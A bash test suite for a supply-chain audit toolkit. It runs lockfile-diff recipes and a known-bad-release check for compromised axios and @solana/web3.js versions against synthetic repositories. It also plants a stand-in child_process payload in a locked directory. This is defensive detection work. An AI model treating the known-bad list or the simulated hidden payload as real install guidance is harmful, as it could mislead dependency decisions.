#!/usr/bin/env bash
# test-lockfile-recipes.sh — run the dependency recipes exactly as the corpus writes them, against throwaway
# repositories, and check what they print:
#   - checklist 11 §11.11, through scripts/git-ro.sh and scripts/recipes/lock-delta.sh as the corpus calls them:
#     the npm / yarn lockfile hint prints each changed version, resolved, integrity or checksum line after the
#     key of its entry (package-lock.json and npm-shrinkwrap.json with and without resolved fields, lockfile
#     v1, an npm alias, yarn v1 and berry), and "?" when the key is outside the hunk, in tab-indented and CRLF
#     lockfiles too; every hint prints the same under a checkout config that sets colour and zero context
#     lines; the changed-files hint, which FULL-AUDIT Step 3.2 repeats, lists a go.mod change; step 4's sweep
#     deletes every entry that is neither a regular file nor a directory, in 0555 and 0000 directories too; the CI
#     budget's two calls, lock-delta.sh set as written and the set its deps.sh call takes, and its closed list of
#     key handlers and KV-077's known-bad releases, the ones lock-delta.sh marks;
#   - the known-bad release check for axios 1.14.1 / 0.30.4 and @solana/web3.js 1.95.6 / 1.95.7, the same
#     commands in FULL-AUDIT Step 3.2, KV-077 Step 2 and (its tree part) discovery/grep-commands.md, its history
#     through scripts/recipes/web3js-history.sh: the single-line shapes (resolved URLs, pnpm v5 and v9 keys, yarn
#     berry, bun, exact pins), and the key-line form in the tree and in history (added, removed, a changed key,
#     an alias, a deleted lockfile, a merged side branch, a merge commit, tab and CRLF lockfiles), but not
#     another package at those versions; the single-line history search; above 64 KiB;
#   - the scratch-directory recipes, KV-089 Steps 1 and 2: with $SCRATCH unset, empty, missing, relative or
#     inside the working directory, also when TMPDIR or $SCRATCH is a link into it or the working directory was
#     entered through a link, or with mktemp failing, they print OUTCOME: no scratch copy and run nothing;
#     otherwise npm runs only inside the scratch directory. FULL-AUDIT Step 3.2 and KV-089 Step 5 run their
#     audits and registry queries through scripts/runner/deps.sh, with no scratch block of their own;
#   - KV-137 Steps 1 and 2: the upstream comparison runs in the bare copy scripts/git-ro.sh copy makes in a run
#     directory, against upstream's default branch whatever its name, and nothing from the checkout's config
#     runs; a TMPDIR inside the working directory stops the copy. Step 2 takes an https:// URL only and fetches
#     over https only: an option-shaped remote.upstream.url that Step 1 prints, a local path or a file:// URL
#     fetches nothing and fires no canary, and an option-shaped deployed commit is refused, never read as an
#     option; its log, above 64 KiB, is cut at 40 lines; SC-054 names the same fetch;
#   - the manifest reads of KV-076 Step 4, KV-078 Step 10, KV-049 Step 4 and KV-089 Step 3, on a PATH with no
#     npm or node: the locked packages with an install script, a declared hook tool, the declared runtime; and
#     KV-078 Step 12's workflow search, under failglob, over a tree whose only workflow is a .yaml file;
#   - checklist 11 SC-063, SC-064 and SC-065 and checklist 14 PY-050, as written: SC-064's installer locator under
#     failglob over every text file of a tree of installer forms and near misses, and its patterns; SC-063's grep
#     over an artifact diff and its RS cross-references; SC-065's allowlist; PY-050's check, which numbers the
#     lines of a requirements file pip may read otherwise (an encoding line, a control character, a byte outside
#     ASCII), its copy of the pins from a hostile requirements file, lines continued with a backslash joined as pip
#     joins them, and the pip-audit call it and discovery/file-map.md give.
# Usage (from the repo root): bash scripts/tests/test-lockfile-recipes.sh
# Needs bash >= 3.2, git, grep, sed, awk, find, mkfifo. No network: the test's git config rewrites the
# upstream's https URL to a local path.
set -uo pipefail
ROOT=$(cd "$(dirname "$0")/../.." && pwd)
CL="$ROOT/checklists/11-supply-chain.md"
FA="$ROOT/FULL-AUDIT.md"
KV077="$ROOT/known-vectors/077-malicious-npm-package-typosquatting.md"
KV089="$ROOT/known-vectors/089-unpatched-server-dependencies.md"
KV137="$ROOT/known-vectors/137-vendored-program-version-drift.md"
GC="$ROOT/discovery/grep-commands.md"
unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_OBJECT_DIRECTORY GIT_COMMON_DIR GIT_NAMESPACE SCRATCH
T=$(mktemp -d "${TMPDIR:-/tmp}/lockfile-recipes.XXXXXX") || exit 1
trap 'chmod -R u+rwX "$T" 2>/dev/null; rm -rf "$T"' EXIT
# A TMPDIR that ends in / (as on macOS) leaves // in $T, which cd drops from $PWD. The recipes compare
# paths with $PWD, so the suite uses the physical path.
T=$(cd "$T" && pwd -P) || exit 1
export GIT_CEILING_DIRECTORIES="$T" GIT_ALLOW_PROTOCOL=file GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 \
  GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@example.invalid GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@example.invalid
pass=0; failn=0
ok()  { pass=$((pass + 1)); echo "PASS $*"; }
bad() { failn=$((failn + 1)); echo "FAIL $*"; }
has() { grep -qxF -- "$2" "$1"; }   # has FILE LINE: FILE holds LINE exactly

# ---- recipe extraction ----------------------------------------------------------------------------------
# The command under the "> # <marker>" comment of a quoted code block in checklist 11, "> " removed.
cl_hint() {
  awk -v m="> # $1" '
    index($0, m) == 1 { g = 1; next }
    g && /^> #/ && !s { next }
    g && (/^> #/ || /^> ```/) { exit }
    g { s = 1; sub(/^> /, ""); print }
  ' "$CL"
}
# The known-bad check: from its first grep to the web3js-history.sh call, comments dropped, indentation removed;
# its tree part is the first 3 of those lines.
kb_block() { awk '/^ *grep -rnE --exclude-dir=node_modules --include=.package\.json./ {g = 1} g && !/^ *#/ {sub(/^ */, ""); print} g && /web3js-history\.sh"$/ {exit}' "$1"; }
kb_tree() { awk '/^ *grep -rnE --exclude-dir=node_modules --include=.package\.json./ {g = 1} g && !/^ *#/ {sub(/^ */, ""); print; if (++n == 3) exit}' "$1"; }
# A known vector's step: the lines of the first code block after "**Step <n>:".
kv_step() { awk -v n="$2" 'index($0, "**Step " n ":") == 1 {s = 1; next} s && /^```$/ {if (c) exit; c = 1; next} s && c' "$1"; }
# FULL-AUDIT Step 3.2, from its heading to the next step's, block indentation removed.
fa_step32() { awk '/^### Step 3\.2 /{g = 1; next} g && /^### /{exit} g {sub(/^  /, ""); print}' "$FA"; }

# ---- fixtures: npm / yarn lockfiles ---------------------------------------------------------------------
npm_lock() { # npm_lock WEB3VER WEB3INT BABELINT SWINT RESOLVED(0|1) — lockfileVersion 3, with an alias entry
  printf '{\n  "name": "app",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n'
  printf '    "": {\n      "name": "app",\n      "version": "1.0.0",\n      "dependencies": {\n'
  printf '        "@solana/web3.js": "^1.95.5",\n        "string-width-cjs": "npm:string-width@^4.2.0"\n      }\n    },\n'
  printf '    "node_modules/@babel/runtime": {\n      "version": "7.25.0",\n'
  [ "$5" = 1 ] && printf '      "resolved": "https://registry.npmjs.org/@babel/runtime/-/runtime-7.25.0.tgz",\n'
  printf '      "integrity": "sha512-%s",\n      "license": "MIT"\n    },\n' "$3"
  printf '    "node_modules/@solana/web3.js": {\n      "version": "%s",\n' "$1"
  [ "$5" = 1 ] && printf '      "resolved": "https://registry.npmjs.org/@solana/web3.js/-/web3.js-%s.tgz",\n' "$1"
  printf '      "integrity": "sha512-%s",\n      "license": "MIT",\n      "dependencies": {\n' "$2"
  printf '        "@babel/runtime": "^7.25.0"\n      }\n    },\n'
  printf '    "node_modules/string-width-cjs": {\n      "name": "string-width",\n      "version": "4.2.3",\n'
  [ "$5" = 1 ] && printf '      "resolved": "https://registry.npmjs.org/string-width/-/string-width-4.2.3.tgz",\n'
  printf '      "integrity": "sha512-%s",\n      "license": "MIT"\n    }\n  }\n}\n' "$4"
}
v1_lock() { # v1_lock WEB3VER WEB3INT BABELINT
  printf '{\n  "name": "app",\n  "version": "1.0.0",\n  "lockfileVersion": 1,\n  "requires": true,\n  "dependencies": {\n'
  printf '    "@babel/runtime": {\n      "version": "7.25.0",\n      "integrity": "sha512-%s"\n    },\n' "$3"
  printf '    "@solana/web3.js": {\n      "version": "%s",\n      "integrity": "sha512-%s",\n' "$1" "$2"
  printf '      "requires": {\n        "@babel/runtime": "^7.25.0"\n      }\n    }\n  }\n}\n'
}
yarn1_lock() { # yarn1_lock WEB3VER WEB3INT BABELINT
  printf '# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\n'
  printf '"@babel/runtime@^7.25.0":\n  version "7.25.0"\n'
  printf '  resolved "https://registry.yarnpkg.com/@babel/runtime/-/runtime-7.25.0.tgz#bbbb"\n  integrity sha512-%s\n\n' "$3"
  printf '"@solana/web3.js@^1.95.5":\n  version "%s"\n' "$1"
  printf '  resolved "https://registry.yarnpkg.com/@solana/web3.js/-/web3.js-%s.tgz#aaaa"\n  integrity sha512-%s\n' "$1" "$2"
  printf '  dependencies:\n    "@babel/runtime" "^7.25.0"\n'
}
berry_lock() { # berry_lock WEB3VER WEB3SUM BABELSUM — @babel/runtime's checksum sits below 7 dependency lines
  printf '# This file is generated by running "yarn install" inside your project.\n'
  printf '# Manual changes might be lost - proceed with caution!\n\n__metadata:\n  version: 8\n  cacheKey: 10c0\n\n'
  printf '"@babel/runtime@npm:^7.25.0":\n  version: 7.25.0\n  resolution: "@babel/runtime@npm:7.25.0"\n  dependencies:\n'
  for d in regenerator-runtime a b c d e f; do printf '    %s: "npm:^1.0.0"\n' "$d"; done
  printf '  checksum: 10c0/%s\n  languageName: node\n  linkType: hard\n\n' "$3"
  printf '"@solana/web3.js@npm:^1.95.5":\n  version: %s\n  resolution: "@solana/web3.js@npm:%s"\n' "$1" "$1"
  printf '  dependencies:\n    "@babel/runtime": "npm:^7.25.0"\n  checksum: 10c0/%s\n  languageName: node\n  linkType: hard\n' "$2"
}
other_locks() { # other_locks WEB3VER INT ANCHORVER ANCHORSUM BORSHSUM — pnpm, bun, Cargo.lock and go.mod
  printf "lockfileVersion: '9.0'\n\npackages:\n\n  '@solana/web3.js@%s':\n    resolution: {integrity: sha512-%s}\n" \
    "$1" "$2" > pnpm-lock.yaml
  printf '{\n  "lockfileVersion": 1,\n  "packages": {\n    "@solana/web3.js": ["@solana/web3.js@%s", "", {}, "sha512-%s"],\n  }\n}\n' \
    "$1" "$2" > bun.lock
  printf '# This file is automatically @generated by Cargo.\nversion = 3\n\n[[package]]\nname = "anchor-lang"\n' > Cargo.lock
  printf 'version = "%s"\nsource = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "%s"\n' "$3" "$4" >> Cargo.lock
  printf 'dependencies = [\n "borsh",\n]\n\n[[package]]\nname = "borsh"\nversion = "1.5.1"\n' >> Cargo.lock
  printf 'source = "registry+https://github.com/rust-lang/crates.io-index"\nchecksum = "%s"\n' "$5" >> Cargo.lock
  printf 'module example.invalid/app\n\ngo 1.22\n\nrequire example.invalid/anchor v%s\n' "$3" > go.mod
}
H="$T/hints"
git init -q "$H" && mkdir -p "$H/rez" "$H/norez" "$H/v1" "$H/shrink" "$H/yarn1" "$H/berry" "$H/tabcrlf" "$H/yarncrlf" \
  "$H/pnpm5" || exit 1
locks() { # locks WEB3VER A B C — every lockfile of the hints fixture
  ( cd "$H" && npm_lock "$1" "$2" "$3" "$4" 1 > rez/package-lock.json && npm_lock "$1" "$2" "$3" "$4" 0 > norez/package-lock.json \
    && npm_lock "$1" "$2" "$3" "$4" 0 > shrink/npm-shrinkwrap.json && v1_lock "$1" "$2" "$3" > v1/package-lock.json \
    && yarn1_lock "$1" "$2" "$3" > yarn1/yarn.lock && berry_lock "$1" "$2" "$3" > berry/yarn.lock \
    && npm_lock "$1" "$2" "$3" "$4" 0 | awk '{gsub(/  /, "\t"); printf "%s\r\n", $0}' > tabcrlf/package-lock.json \
    && yarn1_lock "$1" "$2" "$3" | awk '{printf "%s\r\n", $0}' > yarncrlf/yarn.lock \
    && printf 'lockfileVersion: 5.4\n\npackages:\n\n  /@solana/web3.js/%s:\n    resolution: {integrity: sha512-%s}\n' \
         "$1" "$2" > pnpm5/pnpm-lock.yaml )
}
locks 1.95.5 AAAA BBBB CCCC && (cd "$H" && other_locks 1.95.5 AAAA 0.30.1 aaaa bbbb) \
  && git -C "$H" add -A && git -C "$H" commit -qm base && git -C "$H" tag rev-base \
  && locks 1.95.6 DDDD EEEE FFFF && (cd "$H" && other_locks 1.95.6 DDDD 0.31.0 dddd eeee) \
  && git -C "$H" commit -qam head && git -C "$H" tag rev-head || { echo "could not build the hints fixture" >&2; exit 1; }

# ---- 1. §11.11 lockfile hints -----------------------------------------------------------------------------
run_hint() { # run_hint MARKER OUT: the hint, <base>..<head> and the installation filled in, run in the fixture
  cl_hint "$1" | sed -e 's/<base>\.\.<head>/rev-base..rev-head/' -e "s#<auditor-skill root>#$ROOT#g" > "$T/hint.sh"
  if [ ! -s "$T/hint.sh" ]; then : > "$2"; return 1; fi
  ( cd "$H" && bash "$T/hint.sh" ) > "$2" 2> "$T/hint.err"
}
NPM='npm (package-lock.json, npm-shrinkwrap.json)'
run_hint "$NPM" "$T/npm.out"
for want in \
  '+++ b/norez/package-lock.json' \
  '"node_modules/@solana/web3.js" -      "version": "1.95.5",' \
  '"node_modules/@solana/web3.js" +      "version": "1.95.6",' \
  '"node_modules/@babel/runtime" +      "integrity": "sha512-EEEE",' \
  '"name": "string-width" +      "integrity": "sha512-FFFF",' \
  '+++ b/shrink/npm-shrinkwrap.json' \
  '"node_modules/@solana/web3.js" +      "resolved": "https://registry.npmjs.org/@solana/web3.js/-/web3.js-1.95.6.tgz",' \
  '"@solana/web3.js" +      "version": "1.95.6",' \
  '"@solana/web3.js@^1.95.5" +  version "1.95.6"' \
  '"@babel/runtime@^7.25.0" +  integrity sha512-EEEE' \
  '"@solana/web3.js@npm:^1.95.5" +  resolution: "@solana/web3.js@npm:1.95.6"' \
  '? +  checksum: 10c0/EEEE' \
  "$(printf '"node_modules/@solana/web3.js" +\t\t\t"version": "1.95.6",')" \
  "$(printf '"node_modules/@babel/runtime" +\t\t\t"integrity": "sha512-EEEE",')"; do
  if has "$T/npm.out" "$want"; then ok "npm/yarn hint prints: $want"; else bad "npm/yarn hint lacks: $want"; fi
done
if [ "$(grep -cxF '"@babel/runtime@^7.25.0" +  integrity sha512-EEEE' "$T/npm.out")" = 2 ]; then
  ok "npm/yarn hint names an integrity-only change in a CRLF yarn.lock"
else bad "npm/yarn hint lost the name of an integrity-only change in a CRLF yarn.lock"; fi
n=$(grep -cv -e '^+++ ' -e '^"' -e '^? ' "$T/npm.out")
if [ -s "$T/npm.out" ] && [ "$n" = 0 ]; then ok "npm/yarn hint: every changed line carries a key or ?"
else bad "npm/yarn hint: no output, or $n lines without a key or ?"; sed 's/^/  | /' "$T/npm.out"; fi

for m in 'changed manifests and lockfiles' "$NPM" 'pnpm (pnpm-lock.yaml)' 'bun (text bun.lock)' 'Cargo.lock: each'; do
  run_hint "$m" "$T/plain.out"; git -C "$H" config color.ui always; git -C "$H" config diff.context 0
  run_hint "$m" "$T/hostile.out"; git -C "$H" config --unset color.ui; git -C "$H" config --unset diff.context
  if [ -s "$T/plain.out" ] && grep -qE '1\.95\.6|0\.31\.0|shrinkwrap' "$T/plain.out" && cmp -s "$T/plain.out" "$T/hostile.out"; then
    ok "hint '$m' prints the same under color.ui=always and diff.context=0"
  else bad "hint '$m' output changes with the checkout's colour or context config"; fi
done
has "$T/plain.out" '"borsh" +checksum = "eeee"' && ok "Cargo.lock hint names a checksum-only change" \
  || bad "Cargo.lock hint lost the name of a checksum-only change"
# FULL-AUDIT Step 3.2's list of changed dependency files: the same flags and files as the first hint
stat_args() { tr -d '>\\' | tr -s ' \n' '\n\n' | grep -E -e "^--" -e "^'"; }
cl_hint 'changed manifests and lockfiles' | stat_args > "$T/stat-cl"
awk '/^  # Dependency changes since the baseline/ {g = 1} g && /git-ro\.sh" diff / {print} g && /requirements/ {exit}' "$FA" \
  | stat_args > "$T/stat-fa"
if [ -s "$T/stat-cl" ] && cmp -s "$T/stat-cl" "$T/stat-fa"; then ok "FULL-AUDIT Step 3.2 lists the same dependency files as §11.11"
else bad "FULL-AUDIT Step 3.2's dependency-change list differs from §11.11's"; diff "$T/stat-cl" "$T/stat-fa" | sed 's/^/  | /'; fi
# a go.mod edit (a require or replace line) need not change go.sum, so the list names go.mod too
run_hint 'changed manifests and lockfiles' "$T/stat.out"
if grep -q '^ go\.mod ' "$T/stat.out"; then ok "the changed-files hint lists a go.mod change"
else bad "the changed-files hint does not list a go.mod change"; sed 's/^/  | /' "$T/stat.out"; fi

# step 4: the sweep before any diff or grep, over an artifact whose directories are 0555 and 0000, then the
# check that only files and directories are left, then the diff
sweep=$(sed -n 's/.*Before any `diff` or `grep`, run `\([^`]*\)`.*/\1/p' "$CL")
confirm=$(sed -n 's/.*Then confirm that `\([^`]*\)` prints nothing.*/\1/p' "$CL")
A="$T/art"; mkdir -p "$A/old/pkg" "$A/new/pkg/sub" "$A/new/pkg/ro" "$A/new/pkg/hidden"
echo a > "$A/old/pkg/a.js"; echo b > "$A/new/pkg/a.js"; echo keep > "$T/linked-file"; chmod 444 "$T/linked-file"
ln -s "$T/linked-file" "$A/new/pkg/link"; ln -s sub "$A/new/pkg/dirlink"
mkfifo "$A/new/pkg/sub/fifo" "$A/old/pkg/fifo" "$A/new/pkg/ro/fifo"
echo 'require("child_process")' > "$A/new/pkg/hidden/run.js"; ln -s "$T/linked-file" "$A/new/pkg/hidden/link"
chmod 555 "$A/new/pkg/ro"; chmod 000 "$A/new/pkg/hidden"
( cd "$A" && eval "$sweep" ) > "$T/sweep.out" 2>&1
left=$(cd "$A" && eval "$confirm" 2>&1)
( cd "$A" && diff -ruN old/ new/ ) > "$T/sweep.diff" 2> "$T/sweep.err"
if [ -n "$sweep" ] && [ -n "$confirm" ] && [ -z "$left" ] && [ "$(wc -l < "$T/sweep.out" | tr -d ' ')" = 6 ] \
   && ! grep -q 'Permission denied' "$T/sweep.err" && grep -q 'child_process' "$T/sweep.diff" \
   && [ -f "$A/old/pkg/a.js" ] && [ -d "$A/new/pkg/sub" ] && [ "$(ls -l "$T/linked-file" | cut -c1-10)" = -r--r--r-- ]; then
  ok "step 4 opens 0555 and 0000 directories, deletes and lists links and FIFOs, and changes no link target"
else bad "step 4 ('$sweep', then '$confirm') left: $left"; sed 's/^/  | /' "$T/sweep.out" "$T/sweep.err"; fi

# the CI budget, as §11.11 writes its two calls: lock-delta.sh set runs on a copy of the hints fixture and names
# the set the deps.sh call takes; the closed key-handler list and KV-077's known-bad releases are the ones
# lock-delta.sh marks
awk '/^> \*\*CI budget\*\*/ {g = 1; next} g && /^> ```$/ {if (c) exit; c = 1; next} g && c {sub(/^> /, ""); print}' "$CL" \
  | sed -e 's/<base>\.\.<head>/rev-base..rev-head/' -e "s#<auditor-skill root>#$ROOT#g" -e 's/audit_<n>/audit_1/g' -e 's/<k>/1/g' \
  > "$T/budget.sh"
CB="$T/ci-budget"
git clone -q "$H" "$CB" && (cd "$CB" && "$ROOT/scripts/rundir.sh" new audit >/dev/null) || { bad "could not copy the hints fixture for the CI budget"; }
if [ "$(wc -l < "$T/budget.sh" | tr -d ' ')" = 2 ]; then
  ( cd "$CB" && bash -c "$(sed -n 1p "$T/budget.sh")" ) > "$T/budget.out" 2> "$T/budget.err"; rc=$?
  if [ "$rc" = 0 ] && grep -qx 'lock-set: audit_1/deps/lock-set-1.tsv ([0-9]* rows)' "$T/budget.out" && [ -f "$CB/audit_1/deps/lock-set-1.tsv" ] \
     && grep -q '^"[^"]*/scripts/runner/deps.sh" lock-budget --run audit_1 audit_1/deps/lock-set-1.tsv$' "$T/budget.sh"; then
    ok "§11.11's CI budget: lock-delta.sh set runs as written and keeps the set its deps.sh lock-budget call takes"
  else bad "§11.11's CI budget did not run as written (exit $rc)"; sed 's/^/  | /' "$T/budget.sh" "$T/budget.out" "$T/budget.err"; fi
  if grep -q '	@solana/web3.js	1.95.5	1.95.6	public	public	.*key.*known-bad' "$CB/audit_1/deps/lock-set-1.tsv"; then
    ok "§11.11's CI budget: the hints fixture's @solana/web3.js 1.95.6 is marked key and known-bad"
  else bad "§11.11's CI budget: @solana/web3.js 1.95.6 is not marked key and known-bad"; sed 's/^/  | /' "$CB/audit_1/deps/lock-set-1.tsv"; fi
else bad "§11.11's CI budget does not give its two calls in one code block"; sed 's/^/  | /' "$T/budget.sh"; fi
python3 -I - "$ROOT/scripts/recipes/lock-delta.sh" "$CL" "$KV077" > "$T/lists.out" 2>&1 <<'PY'
import ast, re, sys
src = open(sys.argv[1]).read()
code = re.search(r"\nSET_PY='(.*?)'\n", src, re.S).group(1)
names = {}
for node in ast.parse(code).body:
    if isinstance(node, ast.Assign) and isinstance(node.targets[0], ast.Name) and node.targets[0].id in ("KEY", "KEY_PREFIX", "KNOWN_BAD"):
        names[node.targets[0].id] = ast.literal_eval(node.value)
cl = open(sys.argv[2]).read()
line = re.search(r"^> - \*\*The key handlers\*\*.*$", cl, re.M).group(0)
npm_part, crates_part = line.split("; crates ", 1)
npm = re.findall(r"`([^`]+)`", npm_part.split(": npm ", 1)[1])
crates = re.findall(r"`([^`]+)`", crates_part)
want_npm = list(names["KEY"]["npm"]) + [p + "*" for p in names["KEY_PREFIX"]["npm"]]
ok = sorted(npm) == sorted(want_npm) and sorted(crates) == sorted(names["KEY"]["crates"])
print(("ok" if ok else "bad") + "\tthe key handlers §11.11 lists are the ones lock-delta.sh marks key: npm %s, crates %s" % (npm, crates))
kv = open(sys.argv[3]).read()
m = re.search(r"# Known-bad releases: axios ([0-9.]+) / ([0-9.]+) and the hijacked @solana/web3\.js ([0-9.]+) / ([0-9.]+)\.", kv)
got = {("npm", "axios", m.group(1)), ("npm", "axios", m.group(2)), ("npm", "@solana/web3.js", m.group(3)), ("npm", "@solana/web3.js", m.group(4))} if m else set()
print(("ok" if got and got == set(names["KNOWN_BAD"]) else "bad") + "\tthe known-bad releases lock-delta.sh marks are KV-077 Step 2's: %s" % sorted(got))
PY
while IFS="$(printf '\t')" read -r verdict what; do
  case "$verdict" in ok) ok "$what" ;; *) bad "${what:-the list check could not run: $(cat "$T/lists.out")}" ;; esac
done < "$T/lists.out"

# ---- 2. the known-bad release check ---------------------------------------------------------------------
kb_block "$FA" > "$T/kb-fa.sh"; kb_block "$KV077" > "$T/kb-kv.sh"; kb_tree "$KV077" > "$T/kbt-kv.sh"; kb_tree "$GC" > "$T/kbt-gc.sh"
sed "s#<auditor-skill root>#$ROOT#g" "$T/kb-fa.sh" > "$T/kb-run.sh"
if [ -s "$T/kb-fa.sh" ] && cmp -s "$T/kb-fa.sh" "$T/kb-kv.sh" && [ "$(wc -l < "$T/kbt-kv.sh" | tr -d ' ')" = 3 ] \
   && cmp -s "$T/kbt-kv.sh" "$T/kbt-gc.sh"; then
  ok "FULL-AUDIT Step 3.2, KV-077 Step 2 and discovery/grep-commands.md carry the same known-bad check"
else bad "the known-bad check differs between FULL-AUDIT Step 3.2, KV-077 Step 2 and discovery/grep-commands.md"; fi
run_kb() { ( cd "$1" && bash "$T/kb-run.sh" ) > "$T/kb.out" 2>&1; }
c() { git add -A && git commit -qm "$1" && git rev-parse --short HEAD; }

# single-line shapes and the key-line form in the hints fixture, at rev-head
run_kb "$H"
hc=$(git -C "$H" rev-parse --short rev-head)
for want in \
  './rez/package-lock.json:23:      "resolved": "https://registry.npmjs.org/@solana/web3.js/-/web3.js-1.95.6.tgz",' \
  './berry/yarn.lock:25:  resolution: "@solana/web3.js@npm:1.95.6"' \
  "./pnpm-lock.yaml:5:  '@solana/web3.js@1.95.6':" \
  './pnpm5/pnpm-lock.yaml:5:  /@solana/web3.js/1.95.6:' \
  './norez/package-lock.json-21-      "version": "1.95.6",' \
  './shrink/npm-shrinkwrap.json-21-      "version": "1.95.6",' \
  './v1/package-lock.json-12-      "version": "1.95.6",' \
  "$hc head" \
  "$hc b/norez/package-lock.json +      \"version\": \"1.95.6\"," \
  "$(printf '%s b/tabcrlf/package-lock.json +\t\t\t"version": "1.95.6",' "$hc")"; do
  if has "$T/kb.out" "$want"; then ok "known-bad check: $want"; else bad "known-bad check, missing: $want"; fi
done
if grep -q '^\./tabcrlf/package-lock\.json-[0-9]*-' "$T/kb.out"; then ok "known-bad check, tree: a tab-indented CRLF lockfile"
else bad "known-bad check, tree: the tab-indented CRLF lockfile is missed"; fi

# the key-line form in history: npm lockfiles without resolved fields, filler above 64 KiB, a merged side branch
W="$T/w3"
pl() { # pl FILE WEB3VER [ALIASVER] [DECOYVER] [FILLER]: FILLER entries come first, so the file passes 64 KiB
  {
    printf '{\n  "name": "web",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n'
    printf '    "": {\n      "name": "web",\n      "version": "1.0.0"\n    },\n'
    i=0; while [ "$i" -lt "${5:-0}" ]; do
      printf '    "node_modules/filler-%s": {\n      "version": "1.95.6",\n      "integrity": "sha512-f%s"\n    },\n' "$i" "$i"
      i=$((i + 1)); done
    if [ -n "${4:-}" ]; then printf '    "node_modules/decoy": {\n      "version": "%s",\n      "integrity": "sha512-x"\n    },\n' "$4"; fi
    printf '    "node_modules/@solana/web3.js": {\n      "version": "%s",\n      "integrity": "sha512-w"\n    }' "$2"
    if [ -n "${3:-}" ]; then
      printf ',\n    "node_modules/web3-alias": {\n      "name": "@solana/web3.js",\n      "version": "%s",\n' "$3"
      printf '      "integrity": "sha512-a"\n    }'; fi
    printf '\n  }\n}\n'
  } > "$1"
}
git init -q -b main "$W" && mkdir -p "$W/apps/web" && cd "$W" || exit 1
pl apps/web/package-lock.json 1.95.6 "" "" 1500; C1=$(c root-1.95.6)
pl apps/web/package-lock.json 1.95.5 "" "" 1500; C2=$(c web3-1.95.5)
pl apps/web/package-lock.json 1.95.8 "" 1.95.6 1500; C3=$(c web3-1.95.8-decoy-1.95.6)
git checkout -qb side && pl apps/web/package-lock.json 1.95.7 "" 1.95.6 1500 && C4=$(c side-1.95.7) \
  && pl apps/web/package-lock.json 1.95.8 "" 1.95.6 1500 && C5=$(c side-back) && git checkout -q main \
  && echo x > other && C6=$(c main-other) && git merge -q --no-edit side && git branch -qD side
pl apps/web/npm-shrinkwrap.json 1.95.8 1.95.7 1.95.6 1500; C7=$(c shrinkwrap-alias-1.95.7)
cd "$ROOT" || exit 1
size=$(wc -c < "$W/apps/web/package-lock.json" | tr -d ' ')
git -C "$W" config color.ui always; git -C "$W" config diff.context 0; git -C "$W" config log.showRoot false
git -C "$W" config log.diffMerges cc
run_kb "$W"
f=b/apps/web/package-lock.json
if grep -qx '\./apps/web/npm-shrinkwrap\.json-[0-9]*-      "version": "1\.95\.7",' "$T/kb.out"; then
  ok "known-bad check, tree: the alias entry in npm-shrinkwrap.json"
else bad "known-bad check, tree: the alias entry in npm-shrinkwrap.json is missing"; fi
for want in \
  "$C1 $f +      \"version\": \"1.95.6\"," \
  "$C2 $f -      \"version\": \"1.95.6\"," \
  "$C4 $f +      \"version\": \"1.95.7\"," \
  "$C5 $f -      \"version\": \"1.95.7\"," \
  "$C7 b/apps/web/npm-shrinkwrap.json +      \"version\": \"1.95.7\","; do
  if has "$T/kb.out" "$want"; then ok "known-bad check, key-line form: $want"; else bad "known-bad check, key-line form, missing: $want"; fi
done
if [ "$size" -gt 65536 ] && [ "$(grep -c '1\.95\.6' "$T/kb.out")" = 2 ]; then
  ok "known-bad check passes over filler and the decoy at 1.95.6 ($size-byte lockfile)"
else bad "known-bad check reports another package at 1.95.6, or the lockfile is under 64 KiB ($size bytes)"; sed 's/^/  | /' "$T/kb.out"; fi

# a key that changes beside an unchanged version line, and a deleted lockfile
git init -q "$T/w3k" && mkdir -p "$T/w3k/a" && printf '{\n  "packages": {\n    "node_modules/@solana/web3.js": {\n      "version": "1.95.6",\n      "integrity": "sha512-w"\n    }\n  }\n}\n' > "$T/w3k/a/package-lock.json" \
  && K1=$(cd "$T/w3k" && c add) \
  && printf '{\n  "packages": {\n    "node_modules/other": {\n      "version": "1.95.6",\n      "integrity": "sha512-w"\n    }\n  }\n}\n' > "$T/w3k/a/package-lock.json" \
  && K2=$(cd "$T/w3k" && c rename) && pl "$T/w3k/a/npm-shrinkwrap.json" 1.95.7 && K3=$(cd "$T/w3k" && c shrinkwrap) \
  && rm "$T/w3k/a/npm-shrinkwrap.json" && K4=$(cd "$T/w3k" && c drop)
run_kb "$T/w3k"
if grep -q "^$K2 b/a/package-lock.json  *\"version\": \"1.95.6\",$" "$T/kb.out" && grep -q "^$K1 " "$T/kb.out"; then
  ok "known-bad check, history: a commit that changes the key beside an unchanged version line"
else bad "known-bad check, history: the changed key is not reported"; sed 's/^/  | /' "$T/kb.out"; fi
if has "$T/kb.out" "$K4 a/a/npm-shrinkwrap.json -      \"version\": \"1.95.7\","; then
  ok "known-bad check, history: a commit that deletes the lockfile, under its a/ path"
else bad "known-bad check, history: the deleted lockfile is not reported under its a/ path"; sed 's/^/  | /' "$T/kb.out"; fi

# a version only a merge commit brings in (a lockfile regenerated while resolving a conflict), and a pnpm v5 key
M="$T/kbm"
git init -q -b main "$M" && mkdir -p "$M/app" && cd "$M" || exit 1
yl() { printf '"@solana/web3.js@^1.95.5":\n  version "%s"\n  resolved "https://registry.yarnpkg.com/@solana/web3.js/-/web3.js-%s.tgz#a"\n' "$1" "$1" > app/yarn.lock; }
yl 1.95.5; pl app/package-lock.json 1.95.5; echo a > app/x; c base > /dev/null
git checkout -qb feat && echo b > app/x && c feat > /dev/null && git checkout -q main && echo c > app/y && c main-y > /dev/null
git checkout -qb release && git merge -q --no-commit feat > /dev/null 2>&1; yl 1.95.6; pl app/package-lock.json 1.95.6
MM=$(c "merge feat") && git checkout -q main
printf 'lockfileVersion: 5.4\n\npackages:\n\n  /@solana/web3.js/1.95.7:\n    resolution: {integrity: sha512-p}\n' > app/pnpm-lock.yaml
M5=$(c pnpm5)
cd "$ROOT" || exit 1
git -C "$M" config log.diffMerges cc
run_kb "$M"
